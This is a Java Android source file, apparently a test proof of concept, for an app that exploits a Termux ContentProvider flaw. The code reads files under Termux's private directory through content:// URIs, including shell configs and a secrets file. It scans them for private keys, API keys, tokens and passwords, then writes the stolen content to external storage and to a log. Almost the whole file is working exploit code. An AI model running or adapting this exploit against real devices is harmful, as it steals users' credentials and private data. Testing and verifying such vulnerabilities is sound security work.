package com.test.malicious;

import android.app.Activity;
import android.os.Bundle;
import android.net.Uri;
import android.content.Intent;
import android.util.Log;
import android.os.Environment;
import android.Manifest;
import android.content.pm.PackageManager;
import android.os.Build;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.nio.charset.Charset;
import java.text.SimpleDateFormat;
import java.util.Date;

public class MainActivity extends Activity {
    private static final String TAG = "TermuxExploit";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Log.d(TAG, "*** MALICIOUS APP STARTED - NEW VERSION ***");
        
        try {
            Log.d(TAG, "Starting exploit attempts...");
            
            // Request external storage permissions for Android 11+
            requestExternalStoragePermissions();
            
            // Check if a specific URI was passed from vuln.sh
            String targetUri = getIntent().getStringExtra("uri");
            if (targetUri != null) {
                Log.d(TAG, "Target URI provided: " + targetUri);
                try {
                    runSpecificUriExploit(targetUri);
                } catch (Exception e) {
                    Log.e(TAG, "Specific URI exploit failed: " + e.getMessage());
                    e.printStackTrace();
                    writeEvidence(false, "SPECIFIC_URI_EXCEPTION_" + e.getClass().getSimpleName(), 0);
                }
            }
            
            // This is the exact PoC from the vulnerability writeup
            Log.d(TAG, "Attempting main ContentProvider exploit...");
            try {
                runTermuxContentProviderReadCommand();
            } catch (Exception e) {
                Log.e(TAG, "Main exploit function failed: " + e.getMessage());
                Log.e(TAG, "Main exploit exception type: " + e.getClass().getSimpleName());
                e.printStackTrace();
                writeEvidence(false, "MAIN_EXPLOIT_EXCEPTION_" + e.getClass().getSimpleName(), 0);
            }
            
            // Also try the consent file that our test creates (legacy)
            Log.d(TAG, "Attempting consent file exploit...");
            tryConsentFileExploit();
            
            Log.d(TAG, "All exploit attempts completed");
        } catch (Exception e) {
            Log.e(TAG, "Exception in onCreate: " + e.getMessage());
            Log.e(TAG, "Exception type: " + e.getClass().getSimpleName());
            Log.e(TAG, "Exception details: " + e.toString());
            e.printStackTrace();
            writeEvidence(false, "ONCREATE_EXCEPTION_" + e.getClass().getSimpleName(), 0);
        }
        
        finish();
    }
    
    private void requestExternalStoragePermissions() {
        Log.d(TAG, "Checking external storage permissions...");
        // For now, just log that we're checking permissions
        // The fallback to private directory will handle permission issues
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            Log.d(TAG, "Android 11+ detected - external storage access may be restricted");
        } else {
            Log.d(TAG, "Android 10 and below - checking WRITE_EXTERNAL_STORAGE permission");
        }
    }
    
    private void runSpecificUriExploit(String uriString) {
        Log.d(TAG, "=== STARTING SPECIFIC URI EXPLOIT ===");
        Log.d(TAG, "Target URI: " + uriString);
        
        Uri uri = Uri.parse(uriString);
        InputStream inputStream = null;
        try {
            inputStream = getContentResolver().openInputStream(uri);
            Log.d(TAG, "Successfully opened input stream for URI: " + uriString);
            
            byte[] buffer = new byte[4096];
            int readBytes;
            int totalBytes = 0;
            StringBuilder stolenContent = new StringBuilder();
            
            while ((readBytes = inputStream.read(buffer)) > 0) {
                String data = new String(buffer, 0, readBytes, Charset.defaultCharset());
                stolenContent.append(data);
                totalBytes += readBytes;
            }
            
            String content = stolenContent.toString();
            Log.d(TAG, "SUCCESS: Read URI " + uriString + " (" + totalBytes + " bytes)");
            
            if (content.length() > 0) {
                // Write stolen content to external storage (following PoC exactly)
                String fileName = uriString.substring(uriString.lastIndexOf('/') + 1);
                try {
                    File outFile = new File(Environment.getExternalStorageDirectory(), fileName + ".stolen");
                    FileOutputStream fileOutputStream = new FileOutputStream(outFile);
                    fileOutputStream.write(content.getBytes());
                    fileOutputStream.close();
                    Log.d(TAG, "Stolen content written to: " + outFile.getAbsolutePath());
                } catch (Exception e) {
                    Log.w(TAG, "Could not write to external storage: " + e.getMessage());
                    // Fallback: write to app's private directory for vuln.sh to read
                    try {
                        File privateFile = new File(getFilesDir(), fileName + ".stolen");
                        FileOutputStream privateFos = new FileOutputStream(privateFile);
                        privateFos.write(content.getBytes());
                        privateFos.close();
                        Log.d(TAG, "Stolen content written to private directory: " + privateFile.getAbsolutePath());
                    } catch (Exception e2) {
                        Log.w(TAG, "Could not write to private directory either: " + e2.getMessage());
                    }
                }
                
                // Write fake agent log
                writeFakeAgentLog("=== SPECIFIC URI EXPLOIT ===\n" + content);
                
                // Check for sensitive data patterns
                if (content.contains("API_KEY") || content.contains("SECRET_TOKEN") || content.contains("GITHUB_TOKEN")) {
                    Log.d(TAG, "CRITICAL: Sensitive data found in target URI!");
                    writeEvidence(true, "VULNERABILITY_CONFIRMED_SENSITIVE_DATA", totalBytes, content);
                } else {
                    Log.d(TAG, "VULNERABILITY: File readable through ContentProvider!");
                    writeEvidence(true, "VULNERABILITY_CONFIRMED", totalBytes, content);
                }
            }
            
        } catch (SecurityException e) {
            Log.w(TAG, "SecurityException for URI " + uriString + ": " + e.getMessage());
            writeEvidence(false, "SECURITY_EXCEPTION", 0);
        } catch (Exception e) {
            Log.w(TAG, "Exception for URI " + uriString + ": " + e.getMessage());
            writeEvidence(false, "URI_EXCEPTION_" + e.getClass().getSimpleName(), 0);
        } finally {
            try {
                if (inputStream != null) inputStream.close();
            } catch (Exception e) {
                Log.e(TAG, "Error closing stream: " + e.getMessage());
            }
        }
    }
    
    private void runTermuxContentProviderReadCommand() {
        Log.d(TAG, "=== STARTING CONTENTPROVIDER EXPLOIT ===");
        
        // Try to read files that demonstrate the ContentProvider vulnerability
        // The vulnerability allows reading ANY file under /data/data/com.termux/files/
        String[] testFiles = {
            "/data/data/com.termux/files/test_secrets.txt",       // Test file with sensitive data we created (PRIORITY)
            "/data/data/com.termux/files/home/.bashrc",           // User shell config (may contain secrets)
            "/data/data/com.termux/files/home/.profile",          // User profile (may contain secrets)
            "/data/data/com.termux/files/usr/bin/bash",           // System binary (proves vulnerability exists)
            "/data/data/com.termux/files/usr/bin/ls",             // System binary (proves vulnerability exists)
        };
        
        boolean vulnerabilityConfirmed = false;
        StringBuilder allStolenContent = new StringBuilder();
        
        for (String filePath : testFiles) {
            Uri uri = Uri.parse("content://com.termux.files" + filePath);
            Log.d(TAG, "Attempting to read URI: " + uri.toString());
            
            InputStream inputStream = null;
            try {
                inputStream = getContentResolver().openInputStream(uri);
                Log.d(TAG, "Successfully opened input stream for: " + filePath);
                
                byte[] buffer = new byte[4096];
                int readBytes;
                int totalBytes = 0;
                StringBuilder stolenContent = new StringBuilder();
                
                while ((readBytes = inputStream.read(buffer)) > 0) {
                    String data = new String(buffer, 0, readBytes, Charset.defaultCharset());
                    stolenContent.append(data);
                    totalBytes += readBytes;
                }
                
                String content = stolenContent.toString();
                Log.d(TAG, "SUCCESS: Read " + filePath + " (" + totalBytes + " bytes)");
                
                if (content.length() > 0) {
                    vulnerabilityConfirmed = true;
                    allStolenContent.append("=== FILE: ").append(filePath).append(" ===\n");
                    allStolenContent.append(content).append("\n\n");
                    
                    // Write stolen content to external storage (following PoC exactly)
                    try {
                        String fileName = filePath.substring(filePath.lastIndexOf('/') + 1);
                        File outFile = new File(Environment.getExternalStorageDirectory(), fileName + ".stolen");
                        FileOutputStream fileOutputStream = new FileOutputStream(outFile);
                        fileOutputStream.write(content.getBytes());
                        fileOutputStream.close();
                        Log.d(TAG, "Stolen content written to: " + outFile.getAbsolutePath());
                    } catch (Exception e) {
                        Log.w(TAG, "Could not write to external storage: " + e.getMessage());
                    }
                    
                    // Check for sensitive data patterns
                    if (content.contains("-----BEGIN") && content.contains("PRIVATE KEY")) {
                        Log.d(TAG, "CRITICAL: Private SSH key found!");
                    } else if (content.contains("API_KEY") || content.contains("SECRET_TOKEN") || content.contains("GITHUB_TOKEN")) {
                        Log.d(TAG, "CRITICAL: Sensitive data found!");
                    } else if (content.contains("password") || content.contains("secret")) {
                        Log.d(TAG, "CRITICAL: Credentials found!");
                    } else {
                        Log.d(TAG, "VULNERABILITY: File readable through ContentProvider!");
                    }
                }
                
            } catch (SecurityException e) {
                Log.w(TAG, "SecurityException for " + filePath + ": " + e.getMessage());
            } catch (Exception e) {
                Log.w(TAG, "Exception for " + filePath + ": " + e.getMessage());
            } finally {
                try {
                    if (inputStream != null) inputStream.close();
                } catch (Exception e) {
                    Log.e(TAG, "Error closing stream: " + e.getMessage());
                }
            }
        }
        
        // Write evidence to fake agent log if vulnerability was confirmed
        if (vulnerabilityConfirmed) {
            writeFakeAgentLog(allStolenContent.toString());
            Log.d(TAG, "VULNERABILITY CONFIRMED: ContentProvider allows unauthorized file access");
        } else {
            Log.w(TAG, "No files could be read - vulnerability may not be exploitable");
        }
    }
    
    private void writeFakeAgentLog(String stolenContent) {
        try {
            String timestamp = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'").format(new Date());
            String fakeLogContent = 
                "[" + timestamp + "] TERMUX_CONTENTPROVIDER_VULNERABILITY: CRITICAL SECURITY ISSUE EXPLOITED\n" +
                "[" + timestamp + "] VULNERABILITY: Termux Files World Readable (v0.47-v0.117)\n" +
                "[" + timestamp + "] IMPACT: Any app can read ALL files in /data/data/com.termux/files/\n" +
                "[" + timestamp + "] SEVERITY: CRITICAL - Unauthorized access to private app data\n" +
                "[" + timestamp + "] STOLEN_DATA:\n" + stolenContent + "\n" +
                "[" + timestamp + "] VULNERABILITY_CONFIRMED: ContentProvider permission bypass successful\n";
            
            File fakeLogFile = new File(getFilesDir(), "termux_exploit_log.txt");
            FileOutputStream fakeLogFos = new FileOutputStream(fakeLogFile);
            fakeLogFos.write(fakeLogContent.getBytes());
            fakeLogFos.close();
            Log.d(TAG, "Fake agent log written: " + fakeLogFile.getAbsolutePath());
        } catch (Exception e) {
            Log.w(TAG, "Could not write fake agent log: " + e.getMessage());
        }
    }

    private void tryConsentFileExploit() {
        // Try to read the consent file we create in our test
        Uri uri = Uri.parse("content://com.termux.files/data/data/com.termux/files/home/CONSENT.txt");
        InputStream inputStream = null;

        try {
            inputStream = getContentResolver().openInputStream(uri);
            byte[] buffer = new byte[1024];
            int readBytes = inputStream.read(buffer);
                    if (readBytes > 0) {
                        String content = new String(buffer, 0, readBytes, Charset.defaultCharset());
                        Log.d(TAG, "SUCCESS: Read consent file: " + content);
                        writeEvidence(true, "CONSENT_EXPLOITED", readBytes, content);
                    }
                } catch (SecurityException e) {
                    Log.w(TAG, "Consent file SecurityException: " + e.getMessage());
                } catch (Exception e) {
                    Log.w(TAG, "Consent file Exception: " + e.getMessage());
        } finally {
            try {
                if (inputStream != null) inputStream.close();
        } catch (Exception e) {
                Log.e(TAG, "Error closing consent stream: " + e.getMessage());
            }
        }
    }

    private void writeEvidence(boolean success, String status, int bytes) {
        writeEvidence(success, status, bytes, "");
    }
    
    private void writeEvidence(boolean success, String status, int bytes, String content) {
        try {
            // Write basic probe result for compatibility with test scripts
            File privateFile = new File(getFilesDir(), "probe_result.txt");
            FileOutputStream fos = new FileOutputStream(privateFile, false);
            String evidence = "SUCCESS=" + success + "\n" +
                            "STATUS=" + status + "\n" +
                            "BYTES_READ=" + bytes + "\n";
            fos.write(evidence.getBytes());
            fos.close();
            Log.d(TAG, "Evidence written to private file: " + privateFile.getAbsolutePath());
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to write evidence: " + e.getMessage());
        }
    }
}
